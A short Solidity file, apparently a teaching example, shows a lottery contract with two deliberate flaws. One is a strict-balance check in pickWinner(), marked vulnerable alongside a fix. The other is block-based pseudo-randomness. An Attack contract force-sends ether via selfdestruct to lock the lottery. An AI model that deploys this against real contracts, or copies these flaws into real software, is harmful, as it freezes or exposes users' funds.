// SPDX-License-Identifier: MIT
/*
  Forcefully sending ether to a contract using selfdestruct despite having no payable functions. 
  Sending some uneven amount or surplus of ether breaks the logic in pickWinner() in this scenario.
*/

pragma solidity 0.6.12;

contract Lottery {
    uint public constant PRICE_PER_TICKET = 1 ether;
    uint public constant MAX_PARTICIPANTS = 10;
    address public admin;

    address[] participants;

    constructor() public {
        admin = msg.sender;
    }

    function getTicket() external payable {
        require(participants.length < MAX_PARTICIPANTS, "Sold out");
        require(msg.value == PRICE_PER_TICKET, "Incorrect amount");

        participants.push(msg.sender); // Can buy multiple tickets
    }

    function pickWinner(bytes32 salt) external {
        require(msg.sender == admin, "Admin only");
        require(address(this).balance == PRICE_PER_TICKET * MAX_PARTICIPANTS, "Target amount not reached"); // Vulnerable
        // Keep a separate variable to track total raised amount instead
        uint winnerIndex = uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, salt))) % MAX_PARTICIPANTS; // pseudo-random

        payable(participants[winnerIndex]).transfer(address(this).balance);
    }
}

contract Attack {
    function sabotage(address payable target) public payable {
        selfdestruct(target);
    }
}
